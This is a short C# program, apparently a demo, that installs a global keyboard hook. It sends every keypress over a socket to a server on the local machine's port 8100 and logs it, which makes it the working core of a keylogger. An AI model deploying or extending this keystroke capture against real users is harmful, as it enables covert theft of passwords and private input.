using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using AsyncClientServerLib.Client;
using AsyncClientServerLib.Message;
using Domas.DAP.ADF.LogManager;
using MouseKeyboardActivityMonitor;
using MouseKeyboardActivityMonitor.WinApi;

namespace InterceptKeys
{
    static class Program
    {
        static void Main()
        {
            ILogger logger = LogManager.GetLogger("KeyDemo");
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            Application.ThreadException += new System.Threading.ThreadExceptionEventHandler(Application_ThreadException);
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);

            BasicSocketClient client = null;
            Guid clientGuid = Guid.Empty;
            try
            {
                clientGuid = Guid.NewGuid();
                client = new BasicSocketClient();
                client.ReceiveMessageEvent += (handler, message) =>
                {
                    BasicMessage receivedMessage = (BasicMessage)message;
                    byte[] buffer = receivedMessage.GetBuffer();
                    string s = System.Text.ASCIIEncoding.Unicode.GetString(buffer);
                    logger.Debug(s);
                };
                client.ConnectionEvent += (handler) =>
                {
                    logger.Debug("Client connected to remote server");
                };
                client.CloseConnectionEvent += (handler) =>
                {
                    logger.Debug("Client disconnected from remote server");
                };
                client.Connect(new IPEndPoint(IPAddress.Loopback, 8100));

                var m_KeyboardHookManager = new KeyboardHookListener(new GlobalHooker());
                m_KeyboardHookManager.Enabled = true;
                m_KeyboardHookManager.KeyPress += (sender, e) =>
                {
                    //NamedPipe.Sender.SendMessage(new List<string>() { e.KeyChar.ToString() });
                    string s = e.KeyChar.ToString();
                    byte[] buffer = System.Text.ASCIIEncoding.Unicode.GetBytes(s);
                    BasicMessage message = new BasicMessage(clientGuid, buffer);
                    client.SendAsync(message);
                    logger.Debug(string.Format("KeyDown \t\t {0}\n", e.KeyChar));
                };
                Application.Run();
            }
            catch (Exception)
            {
                throw;
            }

        }

        private static void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
            throw new NotImplementedException();
        }

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            throw new NotImplementedException();
        }
    }
}
